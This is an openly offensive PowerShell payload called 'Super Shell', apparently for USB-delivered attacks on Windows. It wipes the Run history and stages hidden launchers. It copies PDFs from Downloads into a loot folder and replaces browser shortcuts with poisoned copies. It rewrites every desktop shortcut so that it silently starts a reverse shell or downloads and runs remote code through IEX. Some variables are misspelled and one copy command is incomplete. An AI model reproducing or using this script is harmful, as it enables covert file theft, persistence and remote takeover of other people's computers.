# Super Shell by DanTheGoodman, don't use maliciously!

# Config Section, configure options with 'yes' or 'no':

# Shortcut Section:
# Note $invisible_shell_launcher must be set to 'yes' for any of the other commands in the Shortcut section to run!!!
# Also, you must be using the elevated version of the payload otherwise the shortcut poisoning wont work!
$invisible_shell_launcher='yes'
$poison_shortcuts='yes'
$shortcut_privesc='no'

# File Stealing Section:
$steal_files_enabled='yes'
$steal_files_usb='yes'
$steal_files_ftp='yes'
$steal_desktop_folder='yes'
$steal_documents_folder='yes'
$steal_downloads_folder='yes'

# Alright let's get to the payload!

# First we clear the runline history:

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue


# Ok now let's get that invisible shell launcher onto the host. Now this will still pop up a window, but it will ensure that no matter what is written in this script it will not make any more pop-ups.

If ($invisile_shell_launcher -eq 'yes') {
  $invis_target="$Env:UserProfile\temp\"
  robocopy "$PSScriptRoot\i.vbs" $invis_target /S /MT /Z
  robocopy "$PSScriptRoot\a.cmd" $invis_target /S /MT /Z
  robocopy "$PSScriptRoot\z.vbs" $invis_target /S /MT /Z
}


# Now, it's USB Extraction time! (if it's enabled, of course)

If ($steal_files_usb -eq 'yes') {
  $exfil_dir="$Env:UserProfile\Downloads"
  $exfil_ext="*.pdf"
  $loot_dir="$PSScriptRoot\lootpile\"
  mkdir $loot_dir
  robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
}

# Alright FTP time!

# Real shortcut section

If ($invisible_shell_launcher -eq 'yes') {
  $poison_file_a="$PSScriptRoot\f o.cmd"
  $poison_file_i="$PSScriptRoot\i.vbs"
  $poison_file_c="$PSScriptRoot\z.cmd"
  mkdir "$Env:UserProfile\temp\"

  robocopy /S /MT /Z
}

If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
  $old_chrome_lnk="C:\Users\Public\Public Desktop\Google Chroime.lnk"
  $chrome_lnk="$Env:UserProfile\Desktop\Google Chrome.lnk"
  $poisoned_chrome="$PSScriptRoot\Google Chrome.lnk"
  del $old_chrome_lnk -Force -Recurse
  robocopy $poison_chrome $chrome_lnk /S /MT /Z
}

If (Test-Path "$Env:UserProfile\Desktop\Mozilla Firefox.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
  $old_firefox_lnk="C:\Users\Public\Public Desktop\Mozilla Firefox.lnk"
  $firefox_lnk="$Env:UserProfile\Desktop\Mozilla Firefox.lnk"
  $poisoned_firefox="$PSScriptRoot\Mozilla Firefox.lnk"
  del $old_firefox_lnk -Force -Recurse
  robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
}



# Shortcut section (oh this is going to get complicated...)

If ($poison_shortcuts -eq 'yes'  -AND $shortcut_privesc -eq 'yes') {

  # So basically, what this does is it recusively goes through the Desktop, looking for .lnk files, and appends the launch script to get a reverse shell every time the shortcut is executed

  $shortcut_launch_script='powershell Start-Process powershell -Verb runAs -W Hidden "$Env:UserProfile\temp\a.cmd"'
  # Call wscript com object
  $shell = new-object -com wscript.shell

  # Recurse through directories for .lnk files
  dir "$Env:UserProfile\Desktop" -filter *.lnk -recurse | foreach {
  $lnk = $shell.createShortcut($_.fullname)
  $oldPath= $lnk.targetPath

  remove-item $_.fullname
  $lnknew = $shell.createShortcut($_.fullname)
  $lnknew.targetPath = $lnknew.targetPath + $shortcut_launch_script
  $lnknew.Save()
  }
} ElseIf ($poison_shortcuts -eq 'yes') {
  # Calls a.cmd to silently execute the reverse shell
  $shortcut_launch_script="powershell -ExecutionPolicy Unrestricted -W Hidden `"IEX (New-Object Net.WebClient).DownloadString('https://rawgit.com/name/repository/branch/file');`""
  # Call wscript com object
  $shell = new-object -com wscript.shell

  # Recurse through directories for .lnk files
  dir "$Env:UserProfile\Desktop" -filter *.lnk -recurse | foreach {
  $lnk = $shell.createShortcut($_.fullname)
  $oldPath= $lnk.targetPath

  remove-item $_.fullname
  $lnknew = $shell.createShortcut($_.fullname)
  $lnknew.targetPath = $oldPath + $shortcut_launch_script
  $lnknew.Save()
  }
}
